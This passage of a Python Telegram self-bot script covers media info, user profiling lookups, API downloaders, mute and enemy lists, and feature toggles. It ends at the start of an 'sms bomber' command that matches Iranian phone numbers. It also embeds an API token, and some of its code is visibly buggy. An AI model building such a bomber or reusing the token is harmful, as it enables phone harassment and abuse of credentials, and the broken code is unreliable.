❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.document.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Date ⤳ (`{m.reply_to_message.document.date}`)
❖ File iD ⤳ (`{m.reply_to_message.document.file_id}`)""")
   elif m.reply_to_message.photo: #عکس
     m.edit_text(f"""❖ Size ⤳ (`{m.reply_to_message.photo.width}×{m.reply_to_message.photo.height}`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.photo.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Date ⤳ (`{m.reply_to_message.photo.date}`)
❖ File iD ⤳ (`{m.reply_to_message.photo.file_id}`)""")
   elif m.reply_to_message.video: #ویدیو
     m.edit_text(f"""❖ Type ⤳ (`{m.reply_to_message.video.mime_type}`)
❖ Size ⤳ (`{m.reply_to_message.video.width}×{m.reply_to_message.video.height}`)
❖ Duration ⤳ (`{m.reply_to_message.video.duration}s`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.video.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Date ⤳ (`{m.reply_to_message.video.date}`)
❖ Support Streaming ⤳ (`{m.reply_to_message.video.supports_streaming}`)
❖ File iD ⤳ (`{m.reply_to_message.video.file_id}`)""")
   elif m.reply_to_message.animation: #گیف
     m.edit_text(f"""❖ Size ⤳ (`{m.reply_to_message.animation.width}×{m.reply_to_message.animation.height}`)
❖ Type ⤳ (`{m.reply_to_message.animation.mime_type}`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.animation.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Duration ⤳ (`{m.reply_to_message.animation.duration}s`)
❖ Date ⤳ (`{m.reply_to_message.animation.date}`)
❖ File iD ⤳ (`{m.reply_to_message.animation.file_id}`)""")
   elif m.reply_to_message.sticker: #استیکر
     m.edit_text(f"""❖ Size ⤳ (`{m.reply_to_message.sticker.width}×{m.reply_to_message.sticker.height}`)
❖ Name ⤳ (`{m.reply_to_message.sticker.file_name}`)
❖ Type ⤳ (`{m.reply_to_message.sticker.mime_type}`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.sticker.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Emoji ⤳ (`{m.reply_to_message.sticker.emoji}`)
❖ Is Animated ⤳ (`{m.reply_to_message.sticker.is_animated}`)
❖ Is Video ⤳ (`{m.reply_to_message.sticker.is_video}`)
❖ Sticker Set ⤳ (`{"https://t.me/addstickers/"+m.reply_to_message.sticker.set_name if m.reply_to_message.sticker.set_name else "--"}`)
❖ Date ⤳ (`{m.reply_to_message.sticker.date}`)
❖ File iD ⤳ (`{m.reply_to_message.sticker.file_id}`)""")
   elif m.reply_to_message.voice: #ویس
     m.edit_text(f"""❖ Type ⤳ (`{m.reply_to_message.voice.mime_type}`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.voice.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Duration ⤳ (`{m.reply_to_message.voice.duration}s`)
❖ Date ⤳ (`{m.reply_to_message.voice.date}`)
❖ File iD ⤳ (`{m.reply_to_message.voice.file_id}`)""")
   elif m.reply_to_message.audio: #موزیک
     m.edit_text(f"""❖ Title ⤳ (`{m.reply_to_message.audio.title}`)
❖ Performer ⤳ (`{m.reply_to_message.audio.performer}`)
❖ Type ⤳ (`{m.reply_to_message.audio.mime_type}`)
❖ File Name ⤳ (`{m.reply_to_message.audio.file_name}`)
❖ File Size ⤳ (`{Decimal(int(m.reply_to_message.audio.file_size))/Decimal(1024)/Decimal(1024)}ᴍʙ`)
❖ Duration ⤳ (`{m.reply_to_message.audio.duration}s`)
❖ Date ⤳ (`{m.reply_to_message.audio.date}`)
❖ File iD ⤳ (`{m.reply_to_message.audio.file_id}`)""")
   elif m.reply_to_message.text: #متن
     m.edit_text(f"**Please Reply To A Media/file**")
  except Exception as er:
   m.edit_text(er)

 elif text.startswith((".first_message","تنظیم کامنت اول")):
  try:
   if m.reply_to_message.animation: #گیف
     write("firstcommentmsg.txt",f"animation:{m.reply_to_message.animation.file_id}")
     m.reply("**Gif** Successfully Saved")
   elif m.reply_to_message.sticker: #استیکر
     write("firstcommentmsg.txt",f"sticker:{m.reply_to_message.sticker.file_id}")
     m.reply("**Sticker** Successfully Saved")
   elif m.reply_to_message.text: #متن
     write("firstcommentmsg.txt",f"text:{m.reply_to_message.text}")
     m.reply("**Text** Successfully Saved")
   else:
     m.reply("Please Reply to **Gif** or **Sticker** or **Text**")
  except Exception as er:
   m.edit_text(er)

 elif text == ".status":
  getcontext().prec = 3
  try:
   start = time()
   pv = 0;group = 0;Channel = 0;ch_creator = 0;gp_creator = 0;Bot = 0
   for ii in app.get_dialogs():
      if ii.chat.type in ['ChatType.GROUP','ChatType.SUPERGROUP']:
         group.append(ii.chat.id)
         if ii.chat.is_creator == True:
            gp_creator+=1
      elif ii.chat.type == "ChatType.PRIVATE":
         pv+=1
      elif ii.chat.type == "ChatType.CHANNEL":
         Channel+=1
         if ii.chat.is_creator == True:
            ch_creator+=1
      elif ii.chat.type == "ChatType.BOT":
         Bot+=1
   blocked = app.invoke(GetBlocked(offset=0,limit=0))
   stickered = app.invoke(GetAllStickers(hash=0))
   end = time()
   m.reply_text(f"""**Private Chats:** `{pv}`\n  •• `Bots: {Bot}`\n**Groups:** `{group}`\n  •• `Creator: {gp_creator}`\n**Channels:** `{Channel}`\n  •• `Creator: {ch_creator}`\n**Blocked Users:** `{blocked.count}`\n**Total Stickers Pack Installed:** `{len(list(stickered.sets))}`\nits Took: {Decimal(end) - Decimal(start)}s""")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text == ".tadmin":
  try:
     b = "❖ **Admins** :\n\n"
     c = 1;k = 0
     a = app.get_chat_members(m.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS)
     for i in a:
        if i.user.is_deleted == False:
          b += "├"+str(c)+" ↬ ["+(i.user.mention if i.user.id else "--")+"]\n"
          c += 1
        else:
          k += 1
     if k != 0:
       b += f"├ **Deleted Account Admin** : `{k}`\n└— **Count** : `{k + c - 1}`"
     else:
       b += f"└—  \n **Count** : `{k + c - 1}`"
     m.reply(b)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".game"):
  try:
     games = ["Neon Blaster","Neon Blaster 2","Block Buster","Gravity Ninja","Hexonix","Geometry Run 3D","Disco Ball","Tube Runner","Little Plane","MotoFx 2","Space Traveler","Groovy Ski"]
     jdkh = choice(games)
     m.edit_text(f"**Game name:** `{jdkh}`")
     result = app.get_inline_bot_results("gamee", jdkh)
     app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".bazi"):
  try:
     games = ["Math Battle","Corsairs","LumberJack"]
     jdkh = choice(games)
     m.edit_text(f"**Game name:** `{jdkh}`")
     result = app.get_inline_bot_results("gamebot", jdkh)
     app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".hehe"):
  try:
     games = ["2048","Flappy Bird","Hextris"]
     jdkh = choice(games)
     m.edit_text(f"**Game name:** `{jdkh}`")
     result = app.get_inline_bot_results("awesomebot", jdkh)
     app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".acc"):
  try:
     games = ["0"]
     jdkh = choice(games)
     result = app.get_inline_bot_results("creationdatebot", jdkh)
     app.send_inline_bot_result(m.chat.id, result.query_id, result.results[0].id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
   
 elif text.startswith(".inf"):
  if text.split()[1] == "@this":
    user = m.chat.id
  else:
    user = text.split()[1]
  user = app.get_chat(user)
  try:
   if user.photo:
     down = app.download_media(user.photo.big_file_id)
     app.send_photo(m.chat.id , down , f"""__Chat info__

❖ **Title** : `{user.title}`
❖ **ID** : `{user.id}`
❖ **Username** : `@{user.username if user.username else '--'}`
❖ **Members** : `{user.members_count}`
❖ **Dc ID** : `{user.dc_id}`
❖ **Is Creator** : `{user.is_creator}`
❖ **Is Verified** : `{user.is_verified}`
❖ **Is Restricted** : `{user.is_restricted}`
❖ **Is Scam** : `{user.is_scam}`
❖ **Is Fake** : `{user.is_fake}`
❖ **Sticker Set** : `{"https://t.me/addstickers/"+user.sticker_set_name if user.sticker_set_name else "--"}`
❖ **Description** : `{user.description}`""", reply_to_message_id=m.id)
     os.remove(down)
   else:
     app.send_message(m.chat.id , f"""__Chat info__

❖ **Title** : `{user.title}`
❖ **ID** : `{user.id}`
❖ **Username** : `@{user.username if user.username else '--'}`
❖ **Members** : `{user.members_count}`
❖ **Dc ID** : `{user.dc_id}`
❖ **Is Creator** : `{user.is_creator}`
❖ **Is Verified** : `{user.is_verified}`
❖ **Is Restricted** : `{user.is_restricted}`
❖ **Is Scam** : `{user.is_scam}`
❖ **Is Fake** : `{user.is_fake}`
❖ **Sticker Set** : `{"https://t.me/addstickers/"+user.sticker_set_name if user.sticker_set_name else "--"}`
❖ **Description** : `{user.description}`""", reply_to_message_id=m.id)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".id"):
  try:
   user_id_get = (m.reply_to_message.chat.id if m.reply_to_message else app.get_users(text.split()[1]).id)
   user = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
   count_photo = app.get_chat_photos_count(user_id_get)
   kiri = app.get_users(user_id_get)
   if kiri.photo:
     down = app.download_media(kiri.photo.big_file_id)
     app.send_photo(m.chat.id , down , f"""__Hi Boss, look at `{user.users[0].first_name if user.users[0].first_name else "--"}` information__

❖ **Name** : `{user.users[0].first_name if user.users[0].first_name else "--"}`
❖ **LastName** : `{user.users[0].last_name if user.users[0].last_name else "--"}`
❖ **Id** : `{user.users[0].id if user.users[0].id else "--"}`
❖ **Username** : `@{user.users[0].username if user.users[0].username else "--"}`
❖ **BIO** : `{user.full_user.about if user.full_user.about else "--"}`
❖ **Profile Picture Count** : `{count_photo}`
❖ **Contact** : `{user.users[0].contact}`
❖ **Common Chats Count** : `{user.full_user.common_chats_count if user.full_user.common_chats_count else "0"}`
❖ **Can pin message** : `{user.full_user.can_pin_message}`
❖ **Scam** : `{user.users[0].scam}`
❖ **Premium** : `{user.users[0].premium}`
❖ **Bot** : `{user.users[0].bot}`
❖ **Verified** : `{user.users[0].verified}`
❖ **Deleted** : `{user.users[0].deleted}`
❖ **restricted** : `{user.users[0].restricted}`
❖ **support** : `{user.users[0].support}`
❖ **Phone Calls Available** : `{user.full_user.phone_calls_available}`
❖ **Phone Calls Private** : `{user.full_user.phone_calls_private}`
❖ **Video Calls Available** : `{user.full_user.video_calls_available}`
❖ **Access hash** : `{user.users[0].access_hash}`
❖ **Blocked** : `{user.full_user.blocked}`
`{f"❖ **Current ChatID**: {m.chat.id}" if m.chat.id != user.users[0].id else ""}`""" , reply_to_message_id=m.id)
   else:
     app.send_message(m.chat.id , f"""__User info__

❖ **Name** : `{user.users[0].first_name if user.users[0].first_name else "--"}`
❖ **LastName** : `{user.users[0].last_name if user.users[0].last_name else "--"}`
❖ **Id** : `{user.users[0].id if user.users[0].id else "--"}`
❖ **Username** : `@{user.users[0].username if user.users[0].username else "--"}`
❖ **BIO** : `{user.full_user.about if user.full_user.about else "--"}`
❖ **Profile Picture Count** : `{count_photo}`
❖ **Contact** : `{user.users[0].contact}`
❖ **Status** : `{user.users[0].status}`
❖ **Common Chats Count** : `{user.full_user.common_chats_count if user.full_user.common_chats_count else "0"}`
❖ **Can pin message** : `{user.full_user.can_pin_message}`
❖ **Scam** : `{user.users[0].scam}`
❖ **Premium** : `{user.users[0].premium}`
❖ **Bot** : `{user.users[0].bot}`
❖ **Verified** : `{user.users[0].verified}`
❖ **Deleted** : `{user.users[0].deleted}`
❖ **restricted** : `{user.users[0].restricted}`
❖ **support** : `{user.users[0].support}`
❖ **Phone Calls Available** : `{user.full_user.phone_calls_available}`
❖ **Phone Calls Private** : `{user.full_user.phone_calls_private}`
❖ **Video Calls Available** : `{user.full_user.video_calls_available}`
❖ **Access hash** : `{user.users[0].access_hash}`
❖ **Blocked** : `{user.full_user.blocked}`
`{f"❖ **Current ChatID**: {m.chat.id}" if m.chat.id != user.users[0].id else ""}`""" , reply_to_message_id=m.id)
   os.remove(down)
  except errors.exceptions.bad_request_400.UsernameNotOccupied:
   app.send_message(m.chat.id , f"❖ User Not Valid ❖")

 elif text.startswith(".pp"):
  try:
   user_id_get = (m.reply_to_message.chat.id if m.reply_to_message else app.get_users(text.split()[1]).id)
   user = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
   count_photo = app.get_chat_photos_count(user_id_get)
   kiri = app.get_users(user_id_get)
   if kiri.photo:
     down = app.download_media(kiri.photo.big_file_id)
     app.send_photo(m.chat.id , down , f"""__Hi Boss, look at `{user.users[0].first_name if user.users[0].first_name else "--"}` information__

❖ **Name** : `{user.users[0].first_name if user.users[0].first_name else "--"}`
❖ **LastName** : `{user.users[0].last_name if user.users[0].last_name else "--"}`
❖ **Id** : `{user.users[0].id if user.users[0].id else "--"}`
❖ **Username** : `@{user.users[0].username if user.users[0].username else "--"}`
❖ **BIO** : `{user.full_user.about if user.full_user.about else "--"}`
❖ **Profile Picture Count** : `{count_photo}`
""" , reply_to_message_id=m.id)
   else:
     app.send_message(m.chat.id , f"""__User info__

❖ **Name** : `{user.users[0].first_name if user.users[0].first_name else "--"}`
❖ **LastName** : `{user.users[0].last_name if user.users[0].last_name else "--"}`
❖ **Id** : `{user.users[0].id if user.users[0].id else "--"}`
❖ **Username** : `@{user.users[0].username if user.users[0].username else "--"}`
❖ **BIO** : `{user.full_user.about if user.full_user.about else "--"}`
❖ **Profile Picture Count** : `{count_photo}`
""" , reply_to_message_id=m.id)
   os.remove(down)
  except errors.exceptions.bad_request_400.UsernameNotOccupied:
   app.send_message(m.chat.id , f"❖ User Not Valid ❖")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".i"):
  try:
   user_id_get = (m.reply_to_message.chat.id if m.reply_to_message else app.get_users(text.split()[1]).id)
   user = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
   app.unblock_user("creationdatebot")
   response = app.send_message("creationdatebot" , f"/id {user_id_get}")
   sleep(3)
   spambot_msg = response.id + 1
   status = app.get_messages(chat_id="creationdatebot", message_ids=spambot_msg)
   app.send_message(m.chat.id , f"""
❖ **ID** : `{user.users[0].id if user.users[0].id else "--"}`
❖ **Creation Date** : `{status.text}`
""" , reply_to_message_id=m.id)
  except errors.exceptions.bad_request_400.UsernameNotOccupied:
   app.send_message(m.chat.id , f"❖ User Not Valid ❖")
#______________________________End________________________________
#______________________________Api________________________________
 elif text.startswith(".apk"):
  resu =""
  try:
   req = GET(f"https://one-api.ir/farsroid/?token=257767:6565c68b902f2&action=search&q={text.replace('.apk' , '')}").json()

   for item in req['result']:
    resu += f"❖ Name : {item['title']}\n❖ Link : <a href='{item['link']}'>Download</a>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
    app.edit_message_text(m.chat.id , m.id , resu)
  except:
   m.edit_text(f"❖ Apk Not Found")

 elif text.startswith(".app"):
  resu =""

  try:
   req = GET(f"http://mizban-self.ir/self/py-web/yas/yas.php/?page=1&query={text.replace('.app' , '')}").json()

   for item in req['result']:
    resu += f"❖ Name : {item['title']}\n❖  Format : {item['format']}\n❖Link : {item['link']}\n❖ Password : {item['password']}\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
    app.edit_message_text(m.chat.id , m.id , resu)
  except:
   m.edit_text(f"❖ App Not Found")
   
 elif text.startswith(".instadl"):
  app.edit_message_text(m.chat.id , m.id , f"**Wait**⤳Sending Request to Api . . .")
  s = ""
  i = 1
  try:
   req = GET(f"https://sidepath.ga/api/instagram.php?url={text.split()[1]}").json()["Results"]
   for res in req["post"]:
     if res != None:
       app.send_document(m.chat.id , res , caption=f"Slide Number {i}")
       #s += f"❖ [Slide Number {i}]({res})\n"
       i += 1
   #app.edit_message_text(m.chat.id , m.id , f"Download Link of Post ⤳\n{s}")
   app.send_message(m.chat.id , f" **Successful** ")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".story"):
  app.edit_message_text(m.chat.id , m.id , f"**Wait**⤳Sending Request to Api . . .")
  s = ""
  i = 1
  try:
   req = GET(f"https://sidepath.ga/api/story.php?url={text.split()[1]}").json()
   if req["ok"] == True:
    for res in req["Results"]["story"]:
     if res != None:
       app.send_document(m.chat.id , res["downloadUrl"] , caption=f"Story Number {i} of {text.split()[1]}")
       #s += f"❖ [Story Number {i}]({res})\n"
       i += 1
  # app.edit_message_text(m.chat.id , m.id , f"Download Link of Story ⤳\n{s}")
   app.send_message(m.chat.id , f" **Successful** ")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".pindl"):
  app.edit_message_text(m.chat.id , m.id , f"**Wait**⤳Sending Request to Api . . .")
  try:
   req = GET(f"https://api.otherapi.tk/pinterest?url={text.replace('.pindl' , '')[1::]}").json()["pinterest"]
   app.send_photo(m.chat.id , req["image"] , caption=f"__Image__ Downloaded From **Pinterest**" , reply_to_message_id=m.id)    
  except :
   app.send_video(m.chat.id , req["video"] , caption=f"__Video__ Downloaded From **Pinterest**" , reply_to_message_id=m.id)
   


#______________________________End________________________________
#______________________________Mute & enemy________________________________
 elif text.startswith((".mute","سکوت")):
  try:
   if m.reply_to_message:
    if m.reply_to_message.chat.id not in mutey:
     if m.reply_to_message.chat.id != app.get_me().id:
      mutey.append(m.reply_to_message.chat.id)
      app.edit_message_text(m.chat.id , m.id , f'❖ {m.reply_to_message.from_user.mention} Added To Mute List')
    else:
     app.edit_message_text(m.chat.id , m.id , f'❖ This User {m.reply_to_message.from_user.mention} Already in mutes List')
   else :
    if app.get_users(text.split()[1]).id not in mutey :
     if app.get_users(text.split()[1]).id != app.get_me().id:
      mutey.append(app.get_users(text.split()[1]).id)
      app.edit_message_text(m.chat.id , m.id , f'❖ <a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a> Added To Mute List')
    else:
     app.edit_message_text(m.chat.id , m.id , f'❖ This User <a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a> Already in Mute List')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".unmute","حذف سکوت")):
  try:
   if m.reply_to_message:
    if m.reply_to_message.chat.id in mutey:
     mutey.remove(m.reply_to_message.chat.id)
     app.edit_message_text(m.chat.id , m.id , f'❖ User {m.reply_to_message.from_user.mention} Removed From Mute list')
    else:
     app.edit_message_text(m.chat.id , m.id , f'❖ This User {m.reply_to_message.from_user.mention} is Not in Mute list')
   else :
    if app.get_users(text.split()[1]).id in mutey :
     mutey.remove(app.get_users(text.split()[1]).id)
     app.edit_message_text(m.chat.id , m.id , f'❖ User <a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a> Removed From mute list')
    else:
     app.edit_message_text(m.chat.id , m.id , f'❖ This User <a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a> is Not exist in mute list')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text == ".clearenemy" :
  een = ""
  t_een = 1
  if len(enemy) >= 1:
   for user in enemy:
    een += f"{t_een} - <a href=tg://user?id={user}>{app.get_users(user).first_name}</a>\n"
    t_een += 1
   app.edit_message_text(m.chat.id , m.id , f"❖ Enemy List is cleaned\n{een}")
   enemy.clear()
  else:
   app.edit_message_text(m.chat.id , m.id , f"❖ Enemy List is Empty ") 
  
 elif text == ".clearlove" :
  een = ""
  t_een = 1
  if len(love) >= 1:
   for user in love:
    een += f"{t_een} - <a href=tg://user?id={user}>{app.get_users(user).first_name}</a>\n"
    t_een += 1
   app.edit_message_text(m.chat.id , m.id , f"❖ LOVE List is cleaned\n{een}")
   love.clear()
  else:
   app.edit_message_text(m.chat.id , m.id , f"❖ LOVE List is Empty ") 
  
 elif text == ".allunmute":
  eem = ""
  t_eem = 1
  if len(mutey) >= 1:
   for user in mutey:
    eem += f"{t_eem} - <a href=tg://user?id={user}>{app.get_users(user).first_name}</a>\n"
    t_eem += 1
   app.edit_message_text(m.chat.id , m.id , f"❖ Mute List is cleaned\n{eem}")
   mutey.clear()
  else:
   app.edit_message_text(m.chat.id , m.id , f"❖ Mute List is Empty ") 
   
#______________________________End________________________________

#______________________________On / Off________________________________
 elif text.startswith(".timename"):
  if text.split()[1] == "on":
   json_database.update({"timename":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeName is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timename":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeName is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")
   
 elif text.startswith(".2timename"):
  if text.split()[1] == "on":
   json_database.update({"timename2":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeName v2 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timename2":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeName v2 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".2timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio2":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v2 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio2":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v2 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".3timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio3":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v3 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio3":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v3 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")
   
 elif text.startswith(".4timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio4":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v4 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio4":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v4 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".5timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio5":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v5 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio5":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v5 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")
   
 elif text.startswith(".6timebio"):
  if text.split()[1] == "on":
   json_database.update({"timebio6":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v6 is **ON**")
  elif text.split()[1] == "off":
   json_database.update({"timebio6":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ TimeBio v6 is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".limit_del"):
  b = int(text.split()[1])
  if type(b) == int:
     json_database.update({"limitDel":b})
     write("data.json", json.dumps(json_database))
     m.edit_text(f"❖ Anti Del Member Limit Successfully Updated to {b} ❖")
  else:
     m.edit_text(f"❖ Please Enter A Number ❖")

 elif text.startswith(".fontname"):
  if text.split()[1] == "on":
   json_database.update({"fontname":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Fontname is **ON**") 
  elif text.split()[1] == "off":
   json_database.update({"fontname":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Fontname is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith(".welcome"): 
  s = ""
  try:
   if text.split()[1] == "on":
     json_database.update({"welcome":"on"})
     write("data.json", json.dumps(json_database))
     m.edit_text(f"❖ Welcome Mode is **ON**") 
   elif text.split()[1] == "off":
     json_database.update({"welcome":"off"})
     write("data.json", json.dumps(json_database))
     m.edit_text(f"❖ Welcome Mode is **OFF**")
   elif text.split()[1] == None:
     m.edit_text(f"**Error**\n❖ `.welcome` ⤳ (`ᴏɴ ᴏʀ ᴏғғ`)\n├⤳`add` (`-100 + **ᴄʜᴀᴛ-ɪᴅ`)\n├⤳`del` (`-100 + **ᴄʜᴀᴛ-ɪᴅ`)\n├⤳`clear`\n├⤳`list`")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   

 elif text.startswith(".firstcom"):
  if text.split()[1] == "on":
   json_database.update({"firstcom":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ First Comment is **ON**") 
  elif text.split()[1] == "off":
   json_database.update({"firstcom":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ First Comment is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")
   

 elif text.startswith(".anti_fuck"):
  if text.split()[1] == "on":
   json_database.update({"anti_del":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Anti Delete Member Mode  is **ON**") 
  elif text.split()[1] == "off":
   json_database.update({"anti_del":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Anti Delete Member Mode **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")   
   
 elif text.startswith(".on_off_status"):
  mh = ""
  a = json_read("data.json")
  pairs = a.items()
  for key, value in pairs:
    mh += f"❖ {key} -> {value}\n"
  m.edit_text(f"{mh}")
#______________________________End________________________________
 elif text.startswith("پاسخگویی روشن"):
   json_database.update({"autoan":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Auto Answer is **ON**") 
 elif text.startswith("پاسخگویی خاموش"):
   json_database.update({"autoan":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Auto Answer is **OFF**")
#______________________________auto Answer________________________________
 elif text.startswith(".answer"):
  if text.split()[1] == "on":
   json_database.update({"autoan":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Auto Answer is **ON**") 
  elif text.split()[1] == "off":
   json_database.update({"autoan":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Auto Answer is **OFF**")
  else:
   m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith("افزودن پاسخ"):
   an = text.replace("افزودن پاسخ" , "")[1::].split(":")[0]
   en = text.replace("افزودن پاسخ" , "")[1::].split(":")[1]
   answer.append(an)
   javab.append(en)
   m.edit_text(f"❖ Answer Successfully Added\n[{an} -> {en}]") 

 elif text.startswith(".addan"):
   an = text.replace(".addan" , "")[1::].split(":")[0]
   en = text.replace(".addan" , "")[1::].split(":")[1]
   answer.append(an)
   javab.append(en)
   m.edit_text(f"❖ Answer Successfully Added\n[{an} -> {en}]") 
   
 elif text.startswith(".anclear"):
   if len(answer) >= 1:
    answer.clear()
    javab.clear()
    m.edit_text(f"❖ Successful!\nAnswer List Cleared") 
   else:
    app.edit_message_text(m.chat.id , m.id , f"❖ Answer List is Empty ")  
   
   
 elif text.startswith(".anlist"):
   s = ""
   op = 1
   if len(answer) >= 1:
    for i in range(0,int(len(answer))):
      s += f"❖ {op}: {answer[i]} -> {javab[i]}\n"
      op += 1
    m.edit_text(f"❖ **Answer List:**\n{s}") 
   else:
    app.edit_message_text(m.chat.id , m.id , f"❖ Answer List is Empty ") 
  
#______________________________End________________________________
 elif text.startswith(".monshi2"):
  if text.split()[1] == "on":
   json_database.update({"monshi2":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Monshi2 is **ON**")
  if text.split()[1] == "off":
   json_database.update({"monshi2":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Monshi2 is **OFF**")

   
#______________________________sms bomber________________________________
 elif text.startswith(".sms"):
  try:
   if match(r"09[0-9{9}]" , text.split()[1]):
